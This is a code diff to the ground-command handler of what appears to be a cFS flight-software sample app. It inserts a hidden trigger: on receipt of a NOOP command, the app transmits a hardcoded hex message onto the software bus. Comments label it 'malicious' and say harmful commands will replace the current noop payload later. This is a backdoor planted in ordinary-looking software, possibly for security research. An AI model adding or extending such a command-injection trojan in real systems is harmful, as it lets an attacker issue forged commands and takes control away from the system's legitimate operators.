@@ -74,15 +74,34 @@ bool SAMPLE_APP_VerifyCmdLength(const CFE_MSG_Message_t *MsgPtr, size_t Expected
 void SAMPLE_APP_ProcessGroundCommand(const CFE_SB_Buffer_t *SBBufPtr)
 {
     CFE_MSG_FcnCode_t CommandCode = 0;
-
     CFE_MSG_GetFcnCode(&SBBufPtr->Msg, &CommandCode);
+
+    /*
+    ** Set potential messages to be sent here in hex format
+    ** Basically theyre in reverse from what the ground system outputs
+    ** So now when sample receives the "kill signal" it can run the malicious commands (when i find them)
+    */
+
+    /*
+    ** Change potMsg to desired command, maybe make multiple potential messages
+    ** Then below inside of switch transmit command onto buffer
+    ** Example: long long int potMsg = 0xa400010000c08218;
+    */
+
+    long long int potMsg = 0x2000010000c00618; // es_noop
+
+    CFE_MSG_Message_t* MsgPtr = (CFE_MSG_Message_t *) &(potMsg);
 
     /*
     ** Process SAMPLE app ground commands
     */
-    switch (CommandCode)
+
+    switch (CommandCode) // commandCode is number 0-X for different commands
     {
         case SAMPLE_APP_NOOP_CC:
+
+            CFE_SB_TransmitMsg(MsgPtr, true); // Malicious message here
+
             if (SAMPLE_APP_VerifyCmdLength(&SBBufPtr->Msg, sizeof(SAMPLE_APP_NoopCmd_t)))
             {
                 SAMPLE_APP_NoopCmd((const SAMPLE_APP_NoopCmd_t *)SBBufPtr);
@@ -131,31 +150,12 @@ void SAMPLE_APP_TaskPipe(const CFE_SB_Buffer_t *SBBufPtr)
 
     CFE_MSG_GetMsgId(&SBBufPtr->Msg, &MsgId);
 
+
     /*
     ** Print any commands sent on buffer since sample is subscribed to all major headers
     */
 //    CFE_ES_WriteToSysLog("Sample App: Command Packet: 0x%x\n", (unsigned int)CFE_SB_MsgIdToValue(MsgId));
 //    CFE_ES_WriteToSysLog("Sample App: Command Info: %llx", (long long int)SBBufPtr->LongInt);
-//    CFE_ES_WriteToSysLog("Sample App: Long double: %Lf", (long double)SBBufPtr->LongDouble);
-
-
-    // TODO Figure out how to convert SBPtr to CFE_MSG with CFE_MSG_PTR() Macro
-
-//    CFE_MSG_Message_t MsgPtr;
-//    MsgPtr.Pri = SBBufPtr->LongInt;
-
-//    CFE_SB_TransmitMsg(const CFE_MSG_Message_t *MsgPtr, bool IsOrigination);
-//    CFE_Status_t status = CFE_SB_TransmitMsg(CFE_MSG_PTR(SBBufPtr->LongInt), true);
-/*
-    if (status)
-    {
-        CFE_ES_WriteToSysLog("SAMPLE APP: Replicate success");
-    }
-    else
-    {
-        CFE_ES_WriteToSysLog("SAMPLE APP: Not success");
-    }
-*/
 
     switch (CFE_SB_MsgIdToValue(MsgId))
     {
